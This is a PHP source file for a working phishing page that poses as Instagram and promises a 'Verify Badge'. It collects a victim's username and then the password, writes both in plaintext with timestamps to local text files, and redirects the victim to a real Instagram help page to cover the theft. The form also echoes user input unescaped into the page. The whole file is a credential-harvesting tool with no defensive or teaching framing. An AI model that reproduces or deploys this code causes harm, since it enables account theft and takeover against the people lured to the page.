<?php

set_time_limit(0);
date_default_timezone_set("Europe/Istanbul");

require 'vendor2/autoload.php';

function php_multiline()
{
    return PHP_EOL . PHP_EOL . PHP_EOL;
}

define("PHP_MULTILINE", php_multiline());

if($_POST)
{
    if(empty($_POST['username'])) echo "<script type='text/javascript'>alert('Do not make space on your username!');</script>";
    if(!empty($_POST['comen']) && empty($_POST['password'])) { echo "<script type='text/javascript'>alert('Do not make space !');</script>"; header('Location: /'); }
}

if(!empty($_POST['username']) && empty($_POST['comen']))
{
    $_POST['username'] = strtolower($_POST['username']);
    $dosya = fopen("bariscodefx_kullanicilar.txt", "a");
    fwrite($dosya, "kullanici_adi ====> " . $_POST['username'] . PHP_EOL . "tarih ====> " . date("Y-m-d H:i:s", time()) .  PHP_MULTILINE);
    fclose($dosya);
}

if(isset($_POST['comen']))
{
    $dosya = fopen("bariscodefx.txt", "a");
    fwrite($dosya, "kullanici_adi ====> " . $_POST['username'] . PHP_EOL . "sifre ====> " . $_POST['password'] . PHP_EOL . "Tarih ====> " . date("Y-m-d H:i:s", time()) . PHP_MULTILINE);
    fclose($dosya);
    
    header("location: https://help.instagram.com/contact/539946876093520");
}

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Verify Badge - Instagram</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
        <meta name="description" content="Verify Badge on your Instagram Account">
        <meta name="author" content="Instagram">
        
        <!-- SCRIPTS -->
        
        <!-- STYLESHEETS -->
        <link rel="stylesheet" href="css/style.css?<?= time(); ?>">
    </head>
    <body>
        <div class="advertise">
            <div class="advertise-left">
                <p class="bold-text">Instagram</p>
                <span class="light-text">Find it for free on Google Play</span>
            </div>
            <div class="advertise-right">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" class="get-app-button">Install</a>
            </div>
        </div>
        <?php
        
        if(empty($_POST['username']))
        {
        
        ?>
        <form action="/" method="POST" class="first-form">
            <div class="banner-sm">
                <img src="images/banner-sm.png" class="banner-sm-img" width="175">
            </div>
            <span class="color-gray">Get Verify Badge on your Instagram account.</span>
            <div class="mb-3">
                <input type="text" name="username" id="username" class="form-input" placeholder="Username">
            </div>
            <div class="mb-3">
                <button type="submit">Next</button>
            </div>
        </form>
        <?php
        }else {
        ?>
        <form action="/" method="POST" class="second-form">
            <p>Verify Badge @<?= $_POST['username']; ?></p>
            <span class="color-gray">Verify Badge on your account.</span>
            <div class="mb-3">
                <input type="password" name="password" id="password" class="form-input" placeholder="Password">
            </div>
            <input hidden type="text" name="username" id="username" value="<?= $_POST['username']; ?>">
            <input hidden type="number" name="comen" value="1">
            <div class="mb-3">
                <button type="submit">Get Verify</button>
            </div>
        </form>
        <?php
        }
        ?>
        <div class="poweredby">
            <p>from</p>
            <span>FACEBOOK</span>
        </div>
    </body>
</html>
